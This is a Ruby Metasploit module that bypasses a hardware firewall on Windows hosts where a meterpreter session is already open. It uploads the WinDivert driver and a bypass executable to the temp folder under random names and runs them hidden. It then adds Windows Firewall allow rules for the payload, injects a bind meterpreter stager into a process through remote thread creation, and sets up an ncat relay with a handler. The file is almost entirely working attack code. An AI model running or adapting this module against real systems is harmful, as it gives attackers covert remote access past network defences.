##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
  
require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Common

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Post Bypass Hardware Firewall',
      'Description'   => %q{
        This module will bypass hardware firewalls by using a signed network filter driver at 
        the Windows kernel level. The driver checks incoming traffic from special source port 
        a fixed destination port, and redirects this traffic to another destination port.

	Only 32 bit meterpreter supported at the moment.
        
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Zoltan Balazs <zoltan1.balazs[at]gmail.com>',
          'basil <basil[at]reqrypt.org>',
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'URL', 'https://github.com/MRGEffitas/hwfwbypass/' ],
        [ 'URL', 'http://http://reqrypt.org/windivert.html' ],
      ],
      'DisclosureDate'=> "Aug 8 2014"
    ))
    register_options(
      [
        OptInt.new('SRCPORT',  [true,  'The client source port', 1337]),
        OptInt.new('ORIGDSTPORT',[true, 'The original destination port, the client connects to this port', 3389]),
        OptInt.new('NEWDSTPORT',[true,  'The new destination port, if the module detects TCP traffic from SRCPORT to ORIGDSTPORT,
					  the module rewrites the destination TCP port to NEWDSTPORT', 31337]),
        OptInt.new('LPORT_CONNECT',[true,'The LPORT to destination bind shell, set same as ORIGDSTPORT', 3389]),
        OptInt.new('LPORT',[true,'The LPORT for the destination bind shell, set same as NEWDSTPORT', 31337]),
        OptInt.new('PID',[false,'The process PID to inject meterpreter',]),

        OptString.new('NEWPAYLOAD',[true,'Meterpreter payload to be used, always use bind meterpreter, and choose x86 or x64 wisely', 'windows/meterpreter/bind_tcp']),
        OptBool.new('HANDLER',   [true, 'Start new multi/handler job on local box.', true]),
        OptString.new('RHOST',[true, 'Remote host to connect the new shell',]),

      ], self.class)

    register_advanced_options(
      [
        OptString.new('PROCESSNAME', [false, 'Inject meterpreter into this process', 'c:\\windows\\syswow64\\notepad.exe'])
      ],self.class)
  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Exploit::Failure::NoAccess, "Not in admins group, cannot escalate with this module")
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Exploit::Failure::NoAccess, "Cannot hwfwbypass from Low Integrity Level")
    end

  end

  def exploit 
    validate_environment!

    check_permissions!

    upload_binaries!

    if sysinfo["Architecture"] =~ /x64/i
        print_error( "64 bit environment detected, fail back to 32 bit meterpreter")
        syspath = session.fs.file.expand_path("%SystemRoot%") + "\\syswow64\\"
	payload = "windows/meterpreter/bind_tcp" 
	#payload = "windows/x64/meterpreter/bind_tcp"
      else
        payload = "windows/meterpreter/bind_tcp"
        syspath = session.fs.file.expand_path('%systemroot%') + "\\system32\\"
      end	

    print_status("Executing uploaded files")
    # execute the hwfwbypass binaries
    cmd =  "cmd.exe /c start /d#{expand_path("%TEMP%")} /b  #{path_bypass_exe} #{datastore['SRCPORT']} #{datastore['ORIGDSTPORT']} #{datastore['NEWDSTPORT']}"
    print_status(cmd)
    r = session.sys.process.execute( cmd, nil,{'Hidden' => true})

    print_status("Add exclusion to firewall")
    #Windows firewall add file to exclusion
    cmd =  "#{syspath}cmd.exe /c #{syspath}netsh advfirewall firewall add rule name=MyApplication3 dir=in action=allow program=\"#{path_payload}\" enable=yes profile=domain "
    r = session.sys.process.execute( cmd, nil,{'Hidden' => true})

    cmd =  "#{syspath}cmd.exe /c #{syspath}netsh advfirewall firewall add rule name=MyApplication3 dir=in action=allow program=\"#{path_payload}\" enable=yes profile=public "
    r = session.sys.process.execute( cmd, nil,{'Hidden' => true})

    cmd =  "#{syspath}cmd.exe /c #{syspath}netsh advfirewall firewall add rule name=MyApplication3 dir=in action=allow program=\"#{path_payload}\" enable=yes profile=private "
    r = session.sys.process.execute( cmd, nil,{'Hidden' => true})

    print_status("Firewall exclusion added")
    print_status("Executing meterpreter bind shell")
    pid = nil
    pid = datastore['PID']

    #execute the meterpreter payload
    if pid!=0
      pl = create_payload(payload,datastore['LPORT'])
      inject(pid,pl)
      select(nil, nil, nil, 5)
    else
    # if no PID we create a process to host the Meterpreter session
      print_status("Starting process to host payload")
      pl = create_payload(payload,datastore['LPORT'])
      pid_num = start_proc(datastore['PROCESSNAME'])
      inject(pid_num,pl)
      select(nil, nil, nil, 5)
    end

    if datastore['HANDLER']
      print_status("Starting Ncat")
      start_ncat(datastore['LPORT_CONNECT'],datastore['SRCPORT'],datastore['RHOST'],datastore['ORIGDSTPORT'])
      print_status("Start handlers")
      create_multi_handler(payload,datastore['LPORT_CONNECT'],'127.0.0.1')
    end
  end

  def path_bypass_exe
    @bypass_path_exe ||= "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.exe"
  end

  def path_bypass_driver
    if sysinfo["Architecture"] =~ /x64/i
      @bypass_path_driver ||= "#{expand_path("%TEMP%")}\\WinDivert64.sys"
    else
      @bypass_path_driver ||= "#{expand_path("%TEMP%")}\\WinDivert32.sys"
    end
  end


  def path_payload
    @payload_path ||= "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.exe"
  end

  def upload_binaries!
    print_status("Uploading the driver files to the filesystem....")

    #
    # Generate payload and random names for upload
    #
    #datastore['LPORT'] = 31337
    if sysinfo["Architecture"] =~ /x64/i
	payload= "windows/meterpreter/bind_tcp"
        path = ::File.join(Msf::Config.data_directory, "post/hwfwbypass/64")
        driver = ::File.join(path, "WinDivert64.sys")

    else
        payload= "windows/meterpreter/bind_tcp"
        path = ::File.join(Msf::Config.data_directory, "post/hwfwbypass/32")
        driver = ::File.join(path, "WinDivert32.sys")

    end
    bpexe = ::File.join(path, "hwfwbypass.exe")
    windivert_dll = ::File.join(path, "WinDivert.dll")
    msvcr110_dll = ::File.join(path, "msvcr110.dll")
    msvcr120_dll = ::File.join(path, "msvcr120.dll")
    print_status("Uploading the HW FW bypass executable and driver to the filesystem...")

    begin
      #
      # Upload HW FW bypass to the filesystem
      #
      upload_file("#{path_bypass_exe}", bpexe)
      print_status("HW FW Bypass (#{path_bypass_exe}) executable uploaded..")
      upload_file("#{expand_path("%TEMP%")}\\WinDivert.dll", windivert_dll)
      print_status("#{expand_path("%TEMP%")}\\WinDivert.dll uploaded")
      upload_file("#{expand_path("%TEMP%")}\\msvcr110.dll", msvcr110_dll)
      print_status("#{expand_path("%TEMP%")}\\msvcr110.dll uploaded")
      upload_file("#{expand_path("%TEMP%")}\\msvcr120.dll", msvcr120_dll)
      print_status("#{expand_path("%TEMP%")}\\msvcr120.dll uploaded")
      upload_file("#{path_bypass_driver}", driver)
      print_status("WinDivert driver (#{path_bypass_driver}) uploaded..")
    rescue ::Exception => e
      print_error("Error uploading file : #{e.class} #{e}")
    end
  end

  def validate_environment!
    #
    # Verify use against Vista+
    #
    winver = sysinfo["OS"]

    unless winver =~ /Windows Vista|Windows 2008|Windows [78]|Windows 2012/
      fail_with(Exploit::Failure::NotVulnerable, "#{winver} is not compatible.")
    end
    print_status("Compatible #{winver} found.")
  end

  def create_multi_handler(payload_to_inject,lport,rhost)
    print_status("Starting connection handler at port #{lport} for #{payload_to_inject} to #{rhost}")
    mul = client.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = session.workspace
    mul.datastore['PAYLOAD']   = payload_to_inject
    mul.datastore['RHOST']     = rhost
    mul.datastore['LPORT']     = lport
    mul.datastore['EXITFUNC']  = 'process'
    mul.datastore['ExitOnSession'] = false

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_good("Multi/Handler started!")
  end

  def create_payload(payload_type,lport)
    print_status("Creating a bind meterpreter stager: LPORT=#{lport}")
    pay = client.framework.payloads.create(payload_type)
    pay.datastore['LPORT'] = lport
    return pay
  end

  def inject(target_pid, payload_to_inject)
    print_status("Injecting meterpreter into process ID #{target_pid}")
    begin
      host_process = session.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
      raw = payload_to_inject.generate
      mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

      print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
      print_status("Writing the stager into memory...")
      host_process.memory.write(mem, raw)
      host_process.thread.create(mem, 0)
      print_good("Successfully injected Meterpreter in to process: #{target_pid}")
    rescue::Exception => e
      print_error("Failed to Inject Payload to #{target_pid}!")
      print_error(e.message)
    end
  end

  def start_ncat(locallistenport,localsourceport,rhost,rport)
   print_status("Starting ncat locally")
   cmd = "ncat -l #{locallistenport} -c \"ncat -p #{localsourceport} #{rhost} #{rport}\" \&"
   print_status(cmd)
   ::IO.popen(cmd, "rb")
  end

  def start_proc(proc_name)
    print_good("Starting process to house Meterpreter Session.")
    proc = client.sys.process.execute(proc_name, nil, {'Hidden' => true })
    print_good("Process created with pid #{proc.pid}")
    return proc.pid
  end
end

